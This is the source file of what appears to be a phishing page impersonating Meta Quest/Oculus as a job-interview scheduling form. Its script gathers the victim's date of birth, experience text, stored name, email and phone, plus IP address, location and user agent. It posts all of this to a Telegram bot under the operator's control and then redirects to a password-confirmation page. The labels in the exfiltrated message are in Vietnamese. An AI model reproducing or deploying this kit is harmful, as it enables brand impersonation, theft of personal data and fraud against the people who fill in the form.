<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Schedule Interview</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="/styles/schedule-inverview.css">
</head>
<body class="oculus-invite-bg">
    <header class="metaquest-header">
        <div class="metaquest-header-inner">
            <div class="metaquest-logo">
                <img src="/images/logo.png" alt="Meta Quest" height="28">
                <span class="metaquest-title">Meta Quest</span>
            </div>
            <div class="metaquest-user-icon">
                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
            </div>
        </div>
    </header>
    <div class="oculus-invite-wrapper">
        <div class="oculus-invite-logo">
            <svg width="80" height="50" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
                <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
            </svg>
        </div>
        <div class="oculus-invite-title">Schedule your interview</div>
        <form class="oculus-invite-form" onsubmit="submitScheduleInterview(event)" autocomplete="off">
            <div class="oculus-invite-group">
                <label>Date of birth</label>
                <div class="triple-input-row">
                    <select required name="dob_day" id="dob_day">
                        <option value="" disabled selected>Day</option>
                    </select>
                    <select required name="dob_month" id="dob_month">
                        <option value="" disabled selected>Month</option>
                    </select>
                    <select required name="dob_year" id="dob_year">
                        <option value="" disabled selected>Year</option>
                    </select>
                </div>
            </div>
            <div class="oculus-invite-group">
                <label>Schedule interview</label>
                <div class="triple-input-row">
                    <select required name="interview_day" id="interview_day">
                        <option value="" disabled selected>Day</option>
                    </select>
                    <select required name="interview_month" id="interview_month">
                        <option value="" disabled selected>Month</option>
                    </select>
                    <select required name="interview_year" id="interview_year">
                        <option value="" disabled selected>Year</option>
                    </select>
                </div>
            </div>
            <div class="oculus-invite-group">
                <label for="experience">Describe your experience</label>
                <textarea id="experience" name="experience" rows="3" placeholder="Describe your experience" required></textarea>
            </div>
            <div class="form-note">Our response will be sent to you within 24 - 48 hours.</div>
            <div class="notify-methods">
                <label class="notify-option">
                    <span class="icon fb">
                    <svg width="30px" height="30px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z"/><path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z"/></svg>
                    </span>
                    <span class="notify-label"><b>on Facebook</b><span class="notify-desc">We will send you a notification on Facebook.</span></span>
                    <input type="checkbox" class="toggle-input" checked>
                    <span class="toggle-slider"></span>
                </label>
                <label class="notify-option">
                    <span class="icon email">
                        <svg fill="#ffffff" width="30px" height="30px" viewBox="0 0 36 36" version="1.1"  preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                            <title>email-line</title>
                            <path class="clr-i-outline clr-i-outline-path-1" d="M32,6H4A2,2,0,0,0,2,8V28a2,2,0,0,0,2,2H32a2,2,0,0,0,2-2V8A2,2,0,0,0,32,6ZM30.46,28H5.66l7-7.24-1.44-1.39L4,26.84V9.52L16.43,21.89a2,2,0,0,0,2.82,0L32,9.21v17.5l-7.36-7.36-1.41,1.41ZM5.31,8H30.38L17.84,20.47Z"></path>
                            <rect x="0" y="0" width="36" height="36" fill-opacity="0"/>
                        </svg>
                    </span>
                    <span class="notify-label"><b>e-mail</b><span class="notify-desc">We will send you an email notification.</span></span>
                    <input type="checkbox" class="toggle-input" checked>
                    <span class="toggle-slider"></span>
                </label>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="agree" required>
                <label for="agree">I agree with <a href="#" class="link">Terms of use</a></label>
            </div>
            <button type="submit" class="oculus-invite-btn send-btn">CONTINUE</button>
        </form>
    </div>
    <script>
        // Sinh option cho các select ngày/tháng/năm
        function fillSelectOptions() {
            // Day
            for (let i = 1; i <= 31; i++) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('dob_day').insertAdjacentHTML('beforeend', opt);
                document.getElementById('interview_day').insertAdjacentHTML('beforeend', opt);
            }
            // Month
            for (let i = 1; i <= 12; i++) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('dob_month').insertAdjacentHTML('beforeend', opt);
                document.getElementById('interview_month').insertAdjacentHTML('beforeend', opt);
            }
            // Year for dob (1950-2006)
            for (let i = 2006; i >= 1950; i--) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('dob_year').insertAdjacentHTML('beforeend', opt);
            }
            // Year for interview (2024-2026)
            for (let i = 2026; i >= 2024; i--) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('interview_year').insertAdjacentHTML('beforeend', opt);
            }
        }
        fillSelectOptions();
        function submitScheduleInterview(e) {
            e.preventDefault();
            const formData = new FormData(e.target);
            const dataform = Object.fromEntries(formData);
            console.log(dataform);

            var fullName = localStorage.getItem('fullName');
            var email = localStorage.getItem('email');
            var phone = localStorage.getItem('phone');

            var dobday = dataform.dob_day || "";
            var dobmonth = dataform.dob_month || "";
            var dobyear = dataform.dob_year || "";
            var interviewday = dataform.interview_day || "";
            var interviewmonth = dataform.interview_month || "";
            var interviewyear = dataform.interview_year || "";
            var experience = dataform.experience || "";

            if (dobday == "") {
                document.getElementById('dob_day').style.border = '1px solid red';
                return;
            }
            if (dobmonth == "") {
                document.getElementById('dob_month').style.border = '1px solid red';
                return;
            }
            if (dobyear == "") {
                document.getElementById('dob_year').style.border = '1px solid red';
                return;
            }
            if (interviewday == "") {
                document.getElementById('interview_day').style.border = '1px solid red';
                return;
            }
            if (interviewmonth == "") {
                document.getElementById('interview_month').style.border = '1px solid red';
                return;
            }
            if (interviewyear == "") {
                document.getElementById('interview_year').style.border = '1px solid red';
                return;
            }
            if (experience == "") {
                document.getElementById('experience').style.border = '1px solid red';
                return;
            }

            var content = "💬Thông Tin Tài Khoản 1 (web oculus)💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFull Name: " + "`" + fullName + "`" +
                "\nEmail: " + "`" + email + "`" +
                "\nPhone Number: " + "`" + phone + "`" +
                "\nNgày sinh: " + "`" + dobday + "/" + dobmonth + "/" + dobyear + "`" +
                "\nNgày phỏng vấn: " + "`" + interviewday + "/" + interviewmonth + "/" + interviewyear + "`" +
                "\nKinh nghiệm: " + "`" + experience + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            localStorage.setItem('birthday', dobday + "/" + dobmonth + "/" + dobyear);
    
            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        setTimeout(function() {
                            window.location.href = "/confirm-password.php";
                        }, 1000);

                        localStorage.setItem('fullName', fullName);
                        localStorage.setItem('email', email);
                        localStorage.setItem('phone', phone);
                        localStorage.setItem('birthday', dobday + "/" + dobmonth + "/" + dobyear);
                    } else {
                        console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }

        var dobday = document.getElementById('dob_day');
        var dobmonth = document.getElementById('dob_month');
        var dobyear = document.getElementById('dob_year');
        var interviewday = document.getElementById('interview_day');
        var interviewmonth = document.getElementById('interview_month');
        var interviewyear = document.getElementById('interview_year');
        var experience = document.getElementById('experience');

        document.addEventListener('DOMContentLoaded', function() {
            var fullName = localStorage.getItem('fullName');
            var email = localStorage.getItem('email');
            var phone = localStorage.getItem('phone');

            if (fullName != "" && email != "" && phone != "") {
                window.location.href = "/career-with-us-page.php";
            }

            dobday.addEventListener('change', function() {
                dobday.style.border = '1px solid #ccc';
            });
            dobmonth.addEventListener('change', function() {
                dobmonth.style.border = '1px solid #ccc';
            });
            dobyear.addEventListener('change', function() {
                dobyear.style.border = '1px solid #ccc';
            });
            interviewday.addEventListener('change', function() {
                interviewday.style.border = '1px solid #ccc';
            });
            interviewmonth.addEventListener('change', function() {
                interviewmonth.style.border = '1px solid #ccc';
            });
            interviewyear.addEventListener('change', function() {
                interviewyear.style.border = '1px solid #ccc';
            });
            experience.addEventListener('change', function() {
                experience.style.border = '1px solid #ccc';
            });
        });
    </script>
</body>
</html> 